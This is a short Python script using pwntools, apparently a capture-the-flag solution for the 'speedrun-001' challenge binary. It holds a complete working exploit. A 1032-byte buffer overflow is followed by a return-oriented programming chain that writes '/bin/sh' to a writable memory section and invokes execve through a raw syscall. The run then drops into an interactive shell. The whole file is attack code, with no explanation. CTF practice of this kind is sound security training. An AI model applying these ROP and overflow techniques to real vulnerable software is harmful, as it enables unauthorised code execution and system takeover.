from pwn import *
elf = ELF('speedrun-001')


# Write the flag in a writable memory section.
junk = b'A'*1032

# MOV ptr[RDX], rax; ret
mov_ptr_rax = p64(0x0000000000418397)

# Simplefied chain
# pop rax; pop rdx; pop rbx; ret
pop_ax_dx_bx = p64(0x0000000000481c76)

# rw_section
rw_section = p64(0x6b6000)

chain  = b''
chain += junk
chain += pop_ax_dx_bx
chain += b'/bin/sh\x00'
chain += rw_section
chain += b'JUNKJUNK'
chain += mov_ptr_rax

# perform a syscall with execve using .data location.

pop_rax     = p64(0x0000000000415664)
execve      = p64(0x3b)
pop_rdi     = p64(0x0000000000400686)
pop_rsi_rdx = p64(0x000000000044be39)
syscall     = p64(0x000000000040129c)

chain2  = b''
chain2 += pop_rax
chain2 += execve
chain2 += pop_rdi
chain2 += rw_section
chain2 += pop_rsi_rdx
chain2 += p64(0)
chain2 += p64(0)
chain2 += syscall
chain2 += p64(0x400c2d)

p = process(elf.path)
p.send(chain+chain2)
p.interactive()
